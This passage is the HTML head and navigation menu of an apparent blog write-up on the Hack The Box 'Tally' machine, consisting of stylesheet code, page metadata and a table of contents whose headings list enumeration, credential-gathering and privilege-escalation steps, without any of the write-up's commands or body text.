<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="generator" content="Hugo 0.99.1" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
<style>
button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}
*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}:before,:after{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}
input,button,select,textarea{font-family:inherit;font-size:inherit;line-height:inherit}
.sr-only{position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0,0,0,0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}
[role="button"]{cursor: pointer;}
.container{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}@media (min-width: 768px){.container{width:750px}}@media (min-width: 992px){.container{width:970px}}@media (min-width: 1200px){.container{width:1170px}}.container-fluid{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}.row{margin-left:-15px;margin-right:-15px}
.col-xs-1, .col-sm-1, .col-md-1, .col-lg-1, .col-xs-2, .col-sm-2, .col-md-2, .col-lg-2, .col-xs-3, .col-sm-3, .col-md-3, .col-lg-3, .col-xs-4, .col-sm-4, .col-md-4, .col-lg-4, .col-xs-5, .col-sm-5, .col-md-5, .col-lg-5, .col-xs-6, .col-sm-6, .col-md-6, .col-lg-6, .col-xs-7, .col-sm-7, .col-md-7, .col-lg-7, .col-xs-8, .col-sm-8, .col-md-8, .col-lg-8, .col-xs-9, .col-sm-9, .col-md-9, .col-lg-9, .col-xs-10, .col-sm-10, .col-md-10, .col-lg-10, .col-xs-11, .col-sm-11, .col-md-11, .col-lg-11, .col-xs-12, .col-sm-12, .col-md-12, .col-lg-12 { position: relative; min-height: 1px; padding-left: 15px; padding-right: 15px; }
@media (min-width: 768px){.col-sm-1,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-10,.col-sm-11,.col-sm-12{float:left}.col-sm-12{width:100%}.col-sm-11{width:91.66666667%}.col-sm-10{width:83.33333333%}.col-sm-9{width:75%}.col-sm-8{width:66.66666667%}.col-sm-7{width:58.33333333%}.col-sm-6{width:50%}.col-sm-5{width:41.66666667%}.col-sm-4{width:33.33333333%}.col-sm-3{width:25%}.col-sm-2{width:16.66666667%}.col-sm-1{width:8.33333333%}.col-sm-pull-12{right:100%}.col-sm-pull-11{right:91.66666667%}.col-sm-pull-10{right:83.33333333%}.col-sm-pull-9{right:75%}.col-sm-pull-8{right:66.66666667%}.col-sm-pull-7{right:58.33333333%}.col-sm-pull-6{right:50%}.col-sm-pull-5{right:41.66666667%}.col-sm-pull-4{right:33.33333333%}.col-sm-pull-3{right:25%}.col-sm-pull-2{right:16.66666667%}.col-sm-pull-1{right:8.33333333%}.col-sm-pull-0{right:auto}.col-sm-push-12{left:100%}.col-sm-push-11{left:91.66666667%}.col-sm-push-10{left:83.33333333%}.col-sm-push-9{left:75%}.col-sm-push-8{left:66.66666667%}.col-sm-push-7{left:58.33333333%}.col-sm-push-6{left:50%}.col-sm-push-5{left:41.66666667%}.col-sm-push-4{left:33.33333333%}.col-sm-push-3{left:25%}.col-sm-push-2{left:16.66666667%}.col-sm-push-1{left:8.33333333%}.col-sm-push-0{left:auto}.col-sm-offset-12{margin-left:100%}.col-sm-offset-11{margin-left:91.66666667%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-0{margin-left:0}}@media (min-width: 992px){.col-md-1,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-10,.col-md-11,.col-md-12{float:left}.col-md-12{width:100%}.col-md-11{width:91.66666667%}.col-md-10{width:83.33333333%}.col-md-9{width:75%}.col-md-8{width:66.66666667%}.col-md-7{width:58.33333333%}.col-md-6{width:50%}.col-md-5{width:41.66666667%}.col-md-4{width:33.33333333%}.col-md-3{width:25%}.col-md-2{width:16.66666667%}.col-md-1{width:8.33333333%}.col-md-pull-12{right:100%}.col-md-pull-11{right:91.66666667%}.col-md-pull-10{right:83.33333333%}.col-md-pull-9{right:75%}.col-md-pull-8{right:66.66666667%}.col-md-pull-7{right:58.33333333%}.col-md-pull-6{right:50%}.col-md-pull-5{right:41.66666667%}.col-md-pull-4{right:33.33333333%}.col-md-pull-3{right:25%}.col-md-pull-2{right:16.66666667%}.col-md-pull-1{right:8.33333333%}.col-md-pull-0{right:auto}.col-md-push-12{left:100%}.col-md-push-11{left:91.66666667%}.col-md-push-10{left:83.33333333%}.col-md-push-9{left:75%}.col-md-push-8{left:66.66666667%}.col-md-push-7{left:58.33333333%}.col-md-push-6{left:50%}.col-md-push-5{left:41.66666667%}.col-md-push-4{left:33.33333333%}.col-md-push-3{left:25%}.col-md-push-2{left:16.66666667%}.col-md-push-1{left:8.33333333%}.col-md-push-0{left:auto}.col-md-offset-12{margin-left:100%}.col-md-offset-11{margin-left:91.66666667%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-9{margin-left:75%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-6{margin-left:50%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-3{margin-left:25%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-0{margin-left:0}}
label { display: inline-block; max-width: 100%; margin-bottom: 5px; font-weight: bold; }
.btn{display:inline-block;margin-bottom:0;font-weight:400;text-align:center;vertical-align:middle;-ms-touch-action:manipulation;touch-action:manipulation;cursor:pointer;background-image:none;border:1px solid transparent;white-space:nowrap;padding:6px 12px;font-size:16px;line-height:1.4;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.btn:focus,.btn:active:focus,.btn.active:focus,.btn.focus,.btn:active.focus,.btn.active.focus{outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}.btn:hover,.btn:focus,.btn.focus{color:#333;text-decoration:none}.btn:active,.btn.active{outline:0;background-image:none;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,0.125);box-shadow:inset 0 3px 5px rgba(0,0,0,0.125)}.btn.disabled,.btn[disabled],fieldset[disabled] .btn{cursor:not-allowed;opacity:.65;filter:alpha(opacity=65);-webkit-box-shadow:none;box-shadow:none}a.btn.disabled,fieldset[disabled] a.btn{pointer-events:none}.btn-default{color:#333;background-color:#fff;border-color:#ccc}.btn-default:focus,.btn-default.focus{color:#333;background-color:#e6e6e6;border-color:#8c8c8c}.btn-default:hover{color:#333;background-color:#e6e6e6;border-color:#adadad}.btn-default:active,.btn-default.active,.open > .dropdown-toggle.btn-default{color:#333;background-color:#e6e6e6;border-color:#adadad}.btn-default:active:hover,.btn-default.active:hover,.open > .dropdown-toggle.btn-default:hover,.btn-default:active:focus,.btn-default.active:focus,.open > .dropdown-toggle.btn-default:focus,.btn-default:active.focus,.btn-default.active.focus,.open > .dropdown-toggle.btn-default.focus{color:#333;background-color:#d4d4d4;border-color:#8c8c8c}.btn-default:active,.btn-default.active,.open > .dropdown-toggle.btn-default{background-image:none}.btn-default.disabled:hover,.btn-default[disabled]:hover,fieldset[disabled] .btn-default:hover,.btn-default.disabled:focus,.btn-default[disabled]:focus,fieldset[disabled] .btn-default:focus,.btn-default.disabled.focus,.btn-default[disabled].focus,fieldset[disabled] .btn-default.focus{background-color:#fff;border-color:#ccc}.btn-default .badge{color:#fff;background-color:#333}.btn-primary{color:#fff;background-color:#195eff;border-color:#004cff}.btn-primary:focus,.btn-primary.focus{color:#fff;background-color:#0045e5;border-color:#00267f}.btn-primary:hover{color:#fff;background-color:#0045e5;border-color:#003ac1}.btn-primary:active,.btn-primary.active,.open > .dropdown-toggle.btn-primary{color:#fff;background-color:#0045e5;border-color:#003ac1}.btn-primary:active:hover,.btn-primary.active:hover,.open > .dropdown-toggle.btn-primary:hover,.btn-primary:active:focus,.btn-primary.active:focus,.open > .dropdown-toggle.btn-primary:focus,.btn-primary:active.focus,.btn-primary.active.focus,.open > .dropdown-toggle.btn-primary.focus{color:#fff;background-color:#003ac1;border-color:#00267f}.btn-primary:active,.btn-primary.active,.open > .dropdown-toggle.btn-primary{background-image:none}.btn-primary.disabled:hover,.btn-primary[disabled]:hover,fieldset[disabled] .btn-primary:hover,.btn-primary.disabled:focus,.btn-primary[disabled]:focus,fieldset[disabled] .btn-primary:focus,.btn-primary.disabled.focus,.btn-primary[disabled].focus,fieldset[disabled] .btn-primary.focus{background-color:#195eff;border-color:#004cff}.btn-primary .badge{color:#195eff;background-color:#fff}.btn-success{color:#fff;background-color:#00bc16;border-color:#00a313}.btn-success:focus,.btn-success.focus{color:#fff;background-color:#008910;border-color:#002304}.btn-success:hover{color:#fff;background-color:#008910;border-color:#00650c}.btn-success:active,.btn-success.active,.open > .dropdown-toggle.btn-success{color:#fff;background-color:#008910;border-color:#00650c}.btn-success:active:hover,.btn-success.active:hover,.open > .dropdown-toggle.btn-success:hover,.btn-success:active:focus,.btn-success.active:focus,.open > .dropdown-toggle.btn-success:focus,.btn-success:active.focus,.btn-success.active.focus,.open > .dropdown-toggle.btn-success.focus{color:#fff;background-color:#00650c;border-color:#002304}.btn-success:active,.btn-success.active,.open > .dropdown-toggle.btn-success{background-image:none}.btn-success.disabled:hover,.btn-success[disabled]:hover,fieldset[disabled] .btn-success:hover,.btn-success.disabled:focus,.btn-success[disabled]:focus,fieldset[disabled] .btn-success:focus,.btn-success.disabled.focus,.btn-success[disabled].focus,fieldset[disabled] .btn-success.focus{background-color:#00bc16;border-color:#00a313}.btn-success .badge{color:#00bc16;background-color:#fff}.btn-info{color:#fff;background-color:#5bc0de;border-color:#46b8da}.btn-info:focus,.btn-info.focus{color:#fff;background-color:#31b0d5;border-color:#1b6d85}.btn-info:hover{color:#fff;background-color:#31b0d5;border-color:#269abc}.btn-info:active,.btn-info.active,.open > .dropdown-toggle.btn-info{color:#fff;background-color:#31b0d5;border-color:#269abc}.btn-info:active:hover,.btn-info.active:hover,.open > .dropdown-toggle.btn-info:hover,.btn-info:active:focus,.btn-info.active:focus,.open > .dropdown-toggle.btn-info:focus,.btn-info:active.focus,.btn-info.active.focus,.open > .dropdown-toggle.btn-info.focus{color:#fff;background-color:#269abc;border-color:#1b6d85}.btn-info:active,.btn-info.active,.open > .dropdown-toggle.btn-info{background-image:none}.btn-info.disabled:hover,.btn-info[disabled]:hover,fieldset[disabled] .btn-info:hover,.btn-info.disabled:focus,.btn-info[disabled]:focus,fieldset[disabled] .btn-info:focus,.btn-info.disabled.focus,.btn-info[disabled].focus,fieldset[disabled] .btn-info.focus{background-color:#5bc0de;border-color:#46b8da}.btn-info .badge{color:#5bc0de;background-color:#fff}.btn-warning{color:#fff;background-color:#f0ad4e;border-color:#eea236}.btn-warning:focus,.btn-warning.focus{color:#fff;background-color:#ec971f;border-color:#985f0d}.btn-warning:hover{color:#fff;background-color:#ec971f;border-color:#d58512}.btn-warning:active,.btn-warning.active,.open > .dropdown-toggle.btn-warning{color:#fff;background-color:#ec971f;border-color:#d58512}.btn-warning:active:hover,.btn-warning.active:hover,.open > .dropdown-toggle.btn-warning:hover,.btn-warning:active:focus,.btn-warning.active:focus,.open > .dropdown-toggle.btn-warning:focus,.btn-warning:active.focus,.btn-warning.active.focus,.open > .dropdown-toggle.btn-warning.focus{color:#fff;background-color:#d58512;border-color:#985f0d}.btn-warning:active,.btn-warning.active,.open > .dropdown-toggle.btn-warning{background-image:none}.btn-warning.disabled:hover,.btn-warning[disabled]:hover,fieldset[disabled] .btn-warning:hover,.btn-warning.disabled:focus,.btn-warning[disabled]:focus,fieldset[disabled] .btn-warning:focus,.btn-warning.disabled.focus,.btn-warning[disabled].focus,fieldset[disabled] .btn-warning.focus{background-color:#f0ad4e;border-color:#eea236}.btn-warning .badge{color:#f0ad4e;background-color:#fff}.btn-danger{color:#fff;background-color:#d9534f;border-color:#d43f3a}.btn-danger:focus,.btn-danger.focus{color:#fff;background-color:#c9302c;border-color:#761c19}.btn-danger:hover{color:#fff;background-color:#c9302c;border-color:#ac2925}.btn-danger:active,.btn-danger.active,.open > .dropdown-toggle.btn-danger{color:#fff;background-color:#c9302c;border-color:#ac2925}.btn-danger:active:hover,.btn-danger.active:hover,.open > .dropdown-toggle.btn-danger:hover,.btn-danger:active:focus,.btn-danger.active:focus,.open > .dropdown-toggle.btn-danger:focus,.btn-danger:active.focus,.btn-danger.active.focus,.open > .dropdown-toggle.btn-danger.focus{color:#fff;background-color:#ac2925;border-color:#761c19}.btn-danger:active,.btn-danger.active,.open > .dropdown-toggle.btn-danger{background-image:none}.btn-danger.disabled:hover,.btn-danger[disabled]:hover,fieldset[disabled] .btn-danger:hover,.btn-danger.disabled:focus,.btn-danger[disabled]:focus,fieldset[disabled] .btn-danger:focus,.btn-danger.disabled.focus,.btn-danger[disabled].focus,fieldset[disabled] .btn-danger.focus{background-color:#d9534f;border-color:#d43f3a}.btn-danger .badge{color:#d9534f;background-color:#fff}.btn-link{color:#000;font-weight:400;border-radius:0}.btn-link,.btn-link:active,.btn-link.active,.btn-link[disabled],fieldset[disabled] .btn-link{background-color:transparent;-webkit-box-shadow:none;box-shadow:none}.btn-link,.btn-link:hover,.btn-link:focus,.btn-link:active{border-color:transparent}.btn-link:hover,.btn-link:focus{color:#000;text-decoration:none;background-color:transparent}.btn-link[disabled]:hover,fieldset[disabled] .btn-link:hover,.btn-link[disabled]:focus,fieldset[disabled] .btn-link:focus{color:#777;text-decoration:none}.btn-lg{padding:10px 16px;font-size:20px;line-height:1.3333333;border-radius:6px}.btn-sm{padding:5px 10px;font-size:14px;line-height:1.5;border-radius:3px}.btn-xs{padding:1px 5px;font-size:14px;line-height:1.5;border-radius:3px}.btn-block{display:block;width:100%}.btn-block + .btn-block{margin-top:5px}
.dropup,.dropdown{position:relative}.dropdown-toggle:focus{outline:0}.dropdown-menu{position:absolute;top:100%;left:0;z-index:1000;display:none;float:left;min-width:160px;padding:5px 0;margin:2px 0 0;list-style:none;font-size:16px;text-align:left;background-color:#fff;border:1px solid #ccc;border:1px solid rgba(0,0,0,0.15);border-radius:4px;-webkit-box-shadow:0 6px 12px rgba(0,0,0,0.175);box-shadow:0 6px 12px rgba(0,0,0,0.175);-webkit-background-clip:padding-box;background-clip:padding-box}.dropdown-menu.pull-right{right:0;left:auto}.dropdown-menu .divider{height:1px;margin:10px 0;overflow:hidden;background-color:#e5e5e5}.dropdown-menu > li > a{display:block;padding:3px 10px;clear:both;font-weight:400;line-height:1.4;color:#333;white-space:nowrap}.dropdown-menu > li > a:hover,.dropdown-menu > li > a:focus{text-decoration:none;color:#262626;background-color:#f5f5f5}.dropdown-menu > .active > a,.dropdown-menu > .active > a:hover,.dropdown-menu > .active > a:focus{color:#fff;text-decoration:none;outline:0;background-color:#195eff}.dropdown-menu > .disabled > a,.dropdown-menu > .disabled > a:hover,.dropdown-menu > .disabled > a:focus{color:#777}.dropdown-menu > .disabled > a:hover,.dropdown-menu > .disabled > a:focus{text-decoration:none;background-color:transparent;background-image:none;filter:progid:DXImageTransform.Microsoft.gradient(enabled = false);cursor:not-allowed}.open > .dropdown-menu{display:block}.open > a{outline:0}.dropdown-menu-right{left:auto;right:0}.dropdown-menu-left{left:0;right:auto}.dropdown-header{display:block;padding:3px 10px;font-size:14px;line-height:1.4;color:#777;white-space:nowrap}.dropdown-backdrop{position:fixed;left:0;right:0;bottom:0;top:0;z-index:990}.pull-right > .dropdown-menu{right:0;left:auto}.dropup .caret,.navbar-fixed-bottom .dropdown .caret{border-top:0;border-bottom:4px dashed;border-bottom:4px solid \9;content:""}.dropup .dropdown-menu,.navbar-fixed-bottom .dropdown .dropdown-menu{top:auto;bottom:100%;margin-bottom:2px}
.nav{margin-bottom:0;padding-left:0;list-style:none}.nav > li{position:relative;display:block}.nav > li > a{position:relative;display:block;padding:5px 10px}.nav > li > a:hover,.nav > li > a:focus{text-decoration:none;background-color:#a52a2a}.nav > li.disabled > a{color:#777}.nav > li.disabled > a:hover,.nav > li.disabled > a:focus{color:#777;text-decoration:none;background-color:transparent;cursor:not-allowed}.nav .open > a,.nav .open > a:hover,.nav .open > a:focus{background-color:#a52a2a;border-color:#000}.nav .nav-divider{height:1px;margin:10px 0;overflow:hidden;background-color:#e5e5e5}.nav > li > a > img{max-width:none}.nav-pills > li{float:left}.nav-pills > li > a{border-radius:4px}.nav-pills > li + li{margin-left:2px}.nav-pills > li.active > a,.nav-pills > li.active > a:hover,.nav-pills > li.active > a:focus{color:#fff;background-color:#195eff}.nav-stacked > li{float:none}.nav-stacked > li + li{margin-top:0px;margin-left:0}.navbar{position:relative;min-height:48px;max-height:48px;margin-bottom:22px;border:1px solid transparent}@media (min-width: 768px){.navbar{border-radius:4px}}@media (max-device-width: 480px) and (orientation: landscape){.navbar-fixed-top .navbar-collapse,.navbar-fixed-bottom .navbar-collapse{max-height:200px}}.navbar-static-top{z-index:1000;border-width:0 0 1px}@media (min-width: 768px){.navbar-static-top{border-radius:0}}.navbar-fixed-top,.navbar-fixed-bottom{position:fixed;right:0;left:0;z-index:1030}@media (min-width: 768px){.navbar-fixed-top,.navbar-fixed-bottom{border-radius:0}}.navbar-fixed-top{top:0;border-width:0 0 1px}.navbar-fixed-bottom{bottom:0;margin-bottom:0;border-width:1px 0 0}@media (min-width: 768px){.navbar > .container .navbar-brand,.navbar > .container-fluid .navbar-brand{margin-left:-15px}}.navbar-fixed-bottom .navbar-nav > li > .dropdown-menu{margin-bottom:0;border-top-right-radius:4px;border-top-left-radius:4px;border-bottom-right-radius:0;border-bottom-left-radius:0}.navbar-default{background-color:#7d1935;border-color:#611329}.navbar-default .navbar-nav > li > a{color:#fff}.navbar-default .navbar-nav > li > a:hover,.navbar-default .navbar-nav > li > a:focus{color:#fff;background-color:#a52a2a}.navbar-default .navbar-nav > .active > a,.navbar-default .navbar-nav > .active > a:hover,.navbar-default .navbar-nav > .active > a:focus{color:#fff;background-color:#611329}.navbar-default .navbar-nav > .disabled > a,.navbar-default .navbar-nav > .disabled > a:hover,.navbar-default .navbar-nav > .disabled > a:focus{color:#ccc;background-color:transparent}.navbar-default .navbar-toggle{border-color:#a52a2a}.navbar-default .navbar-toggle:hover,.navbar-default .navbar-toggle:focus{background-color:#a52a2a}.navbar-default .navbar-toggle .icon-bar{background-color:#888}.navbar-default .navbar-collapse,.navbar-default .navbar-form{border-color:#611329}.navbar-default .navbar-nav > .open > a,.navbar-default .navbar-nav > .open > a:hover,.navbar-default .navbar-nav > .open > a:focus{background-color:#611329;color:#fff}@media (max-width: 767px){.navbar-default .navbar-nav .open .dropdown-menu > li > a{color:#fff}.navbar-default .navbar-nav .open .dropdown-menu > li > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > li > a:focus{color:#fff;background-color:#a52a2a}.navbar-default .navbar-nav .open .dropdown-menu > .active > a,.navbar-default .navbar-nav .open .dropdown-menu > .active > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > .active > a:focus{color:#fff;background-color:#611329}.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a,.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:focus{color:#ccc;background-color:transparent}}.navbar-default .navbar-link{color:#fff}.navbar-default .navbar-link:hover{color:#fff}.navbar-default .btn-link{color:#fff}.navbar-default .btn-link:hover,.navbar-default .btn-link:focus{color:#fff}
.label{display:inline;padding:.2em .6em .3em;font-size:75%;font-weight:700;line-height:1;color:#fff;text-align:center;white-space:nowrap;vertical-align:baseline;border-radius:.25em}a.label:hover,a.label:focus{color:#fff;text-decoration:none;cursor:pointer}.label:empty{display:none}.btn .label{position:relative;top:-1px}.label-default{background-color:#777}.label-default[href]:hover,.label-default[href]:focus{background-color:#5e5e5e}.label-primary{background-color:#195eff}.label-primary[href]:hover,.label-primary[href]:focus{background-color:#0045e5}.label-success{background-color:#00bc16}.label-success[href]:hover,.label-success[href]:focus{background-color:#008910}.label-info{background-color:#5bc0de}.label-info[href]:hover,.label-info[href]:focus{background-color:#31b0d5}.label-warning{background-color:#f0ad4e}.label-warning[href]:hover,.label-warning[href]:focus{background-color:#ec971f}.label-danger{background-color:#d9534f}.label-danger[href]:hover,.label-danger[href]:focus{background-color:#c9302c}.badge{display:inline-block;min-width:10px;padding:3px 7px;font-size:14px;font-weight:700;color:#fff;line-height:1;vertical-align:middle;white-space:nowrap;text-align:center;background-color:#000;border-radius:10px}.badge:empty{display:none}.btn .badge{position:relative;top:-1px}.btn-xs .badge,.btn-group-xs > .btn .badge{top:0;padding:1px 5px}a.badge:hover,a.badge:focus{color:#fff;text-decoration:none;cursor:pointer}
.nav-pills > .active > a > .badge{color:#000;background-color:#fff}.nav-pills > li > a > .badge{margin-left:3px}
.clearfix:before,.clearfix:after,.container:before,.container:after,.container-fluid:before,.container-fluid:after,.row:before,.row:after,.form-horizontal .form-group:before,.form-horizontal .form-group:after,.nav:before,.nav:after,.navbar:before,.navbar:after,.navbar-header:before,.navbar-header:after,.navbar-collapse:before,.navbar-collapse:after{content:" ";display:table}.clearfix:after,.container:after,.container-fluid:after,.row:after,.form-horizontal .form-group:after,.nav:after,.navbar:after,.navbar-header:after,.navbar-collapse:after{clear:both}
.pull-right { float: right !important; } .pull-left { float: left !important; }

 
html { font-size:16px; }
body:not(.en) :lang(en), body:not(.el) :lang(el), body:not(.fr) :lang(fr) { display: none; }
body {
  font-size: 16px; line-height: 1.45; color: #000000;  background-color: #eceff1;
  margin: 0; padding-top: 70px; 
  font-family: 'Open Sans', 'Times New Roman', sans-serif;
  -webkit-animation: bugfix infinite 1s;
}
@-webkit-keyframes bugfix { from { fill: 0; } to { fill: 0; } }

a { color: #000; word-wrap: break-word; text-decoration: none; }
a:hover, a:focus, a:active { color: black; text-decoration: none; }
a.label { box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
figure {  display: table; margin: 10px auto; }
figure figcaption { caption-side: bottom; color: darkblue; display: table-caption;
font-size: 14px; margin-top: 5px; text-align:justify; }
h1, h2, h3, h4, h5, h6 { margin:0px; text-align: justify; }
img { max-width: 100%; }
img.bordered { border:1px solid #021a40;  border-radius:20px; box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
li { line-height: 1.5rem; text-align:justify; }
p { text-align:justify; text-indent: 30px; }
section { margin-top: 1rem; margin-bottom: 1rem; }
section>header { margin-bottom: .3rem; }
ul, ol { padding-left: 1.5rem; }

article .image { background-size: cover; background-position: center; }
article time { font-size: .8rem; }
article.grid { max-width:384px; margin-bottom:0.5rem; height:26rem; overflow: hidden; }
article.grid .image { min-height: 12rem; }
article.grid footer { padding: 1rem; background-color: #ffffe6; }
article.grid .title { overflow: hidden; }
article.grid .summary { color: #333; font-size: .8rem; line-height: 1rem; max-height: 5rem; overflow: hidden; }
article.single { background-color: #fff; margin: 0 auto; padding-bottom: 1rem; max-width:1200px; }
article.single .image { max-width:786px; min-height: 24rem; margin-left:auto; margin-right:auto; }
article.single .body { margin-bottom: 2rem;  padding: 0 5rem; }
article.single .body a:not(.label) { color: #78909c; text-decoration: underline; }
article.single .body>h1, article.single .body>h2, article.single .body>h3 { padding-top: 60px; margin-top: -30px; margin-bottom: 0.5rem; }
article.single .body li {  margin: 0.5rem auto; }
article.li { margin-bottom: .5rem; font-size: .8rem; line-height: 1rem; }
article.li .cell { display:table-cell; vertical-align: middle; }
article.li .image { width: 4.1rem; height: 4.1rem; box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
article.li footer { display:table-cell; vertical-align: middle; padding-left: .5rem;  }
article.li time { font-size: .7rem; }
article.li .title { font-size: 0.85rem; line-height: 1rem; font-weight: 700; }

.body .title { font-size: 2rem; line-height: 3rem; margin: 0.5rem auto; }
.label { display:inline-block; padding-top: 0.25rem; }

.navbar * { color: white !important; }
.navbar .dropdown-menu a:hover { background-color: brown; }
.nav>li>a:hover, .nav>li>a:focus { color: white; background-color: brown; }
.nav-pills { display: inline-block; margin: 0; }
.nav-pills>li.active>a { font-weight: 700 !important; background-color: #00bc16 !important; }
.nav-pills>li.active>a .badge { color: #00bc16; }
.cssdropdown { margin-top: 2rem; }
.cssdropdown input[type=checkbox], .cssdropdown ul { display: none; }
.cssdropdown label { font-size: 1.25rem; font-weight:700; min-width: 300px; }
.cssdropdown input[type=checkbox]:checked ~ ul { display: table-cell; }

.p-logo {
  font-family: 'Comic Sans MS', cursive; font-weight: bold; font-size: 2rem;
  text-shadow: 4px 2px 2px rgba(0,0,0,0.75);
  margin-top: 3px;
}
.l-footer * { color: white; }
.l-footer { background-color: #7D1935; padding: 0.75rem 0; text-align: center; }

.lgfont { font-size: 2rem; }
.margin-sm { margin: 0.5rem; }
.side-margins-1 { margin-left: 1rem !important; margin-right: 1rem !important; }
.side-margins-2 { margin-left: 2rem !important;; margin-right: 2rem !important; }
.margin-top-sm {  margin-top: 0.5rem; }
.topmargin5 {  margin-top: 5px; }
.topmargin7 { margin-top: 7px; }

#search-section, #results-section { display:none; }
#TableOfContents ul { list-style: none; }
#TableOfContents>ul {  padding-left: 0; font-weight: 700; }
#TableOfContents>ul ul { font-weight: normal; }

.summary { text-align:justify; }
.max-width640 { max-width: 640px; }
.floatleft { float:left; margin-right: 10px; }
.floatright { float:right; margin-left: 10px; }

.centered { margin-left: auto !important;  margin-right: auto !important; }
img.centered { display:block !important; }
div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.centered, h2.centered, h3.centered { text-align:center !important; }

@media (max-width: 768px) {
  h1 { font-size: 1.4rem; line-height: 1.5rem; }
  h2 { font-size: 1.2rem; line-height: 1.5rem; }
  article.single .image { min-height: 12rem; }
  article.single .body pre { margin: 1rem -1rem; }
  article.single .body pre code { padding: 1rem 1rem; }
  article.single .body { padding: 0 1rem; }
  ul.scroll-menu { max-height: 250px; }
  .cssdropdown label, .nav-stacked>li>a { min-width: 240px; }
  .hidden768 { display:none; }
  .text-smaller {
    font-family: 'Open Sans', 'Times New Roman', sans-serif;
    font-size: 1rem;  font-weight: 700; letter-spacing: -1px;
    padding-left: 0px !important;  padding-right: 0px !important;
    line-height:32px;
  }
}
</style>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://alamot.github.io/index.xml">

  <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge" />


  <title>Tally write-up - The Portal of Knowledge</title>
  <meta property='og:title' content="Tally write-up - The Portal of Knowledge">
  <meta property="og:type" content="article">
  <meta name="description" content="Write-up for the Tally machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Tally του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
  <meta property="og:description" content="Write-up for the Tally machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Tally του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
  <meta property="og:image" content="https://alamot.github.io/images/dart.jpg">
  <meta property="og:image:width" content="768" />
  <meta property="og:image:height" content="384" />

<meta property="og:url" content="https://alamot.github.io/tally_writeup/">


<script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "mainEntityOfPage":{
      "@type":"WebPage",
      "@id":"https:\/\/alamot.github.io\/"
    },
    "headline": "Tally write-up |  ",
    "image": {
      "@type": "ImageObject",
      "url": "",
      "height": 700,
      "width": 700
    },
    "datePublished": "2018-05-03T00:00:00JST",
    "dateModified": "2018-05-03T00:00:00JST",
    "author": {
      "@type": "Person",
      "name": "Antonios Tsolis",
      "image": "https:\/\/alamot.github.io\/images/logo.png"
    },
    "publisher": {
      "@type": "Organization",
      "name": "",
      "logo": {
        "@type": "ImageObject",
        "url": "https:\/\/alamot.github.io\/images/logo.png",
        "height": 60,
        "width": 60
      }
    },
    "description": ""
  }
</script>
</head>
<body id="mainbody" class="en" lang="en">
<nav class="navbar navbar-default navbar-fixed-top centered">
<div class="container-fluid">
  
   <ul class="nav nav-pills pull-left topmargin7">
    <li id="content-selector" role="presentation" class="dropdown">
    <a class="dropdown-toggle btn-danger" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false"><span lang="en">Contents</span><span lang="el">Περιεχόμενα</span> <i class="fa fa-caret-down" aria-hidden="true"></i></a>
      <ul class="dropdown-menu scroll-menu">
        <li><a href="#title"><span lang="en">Start</span><span lang="el">Αρχή</span></a></li>
        
        
        
         
<li><a href="#enumeration">Enumeration</a>
<ul>
<li><a href="#port-scanning">Port scanning</a></li>
<li><a href="#brute-forcing-microsoft-sharepoint">Brute forcing Microsoft SharePoint</a></li>
<li><a href="#getting-ftp-credentials">Getting FTP credentials</a></li>
<li><a href="#getting-smb-credentials">Getting SMB credentials</a></li>
<li><a href="#getting-mssql-credentials">Getting MSSQL credentials</a></li>
<li><a href="#getting-shell">Getting shell</a></li>
</ul></li>
<li><a href="#privilege-escalation">Privilege Escalation</a>
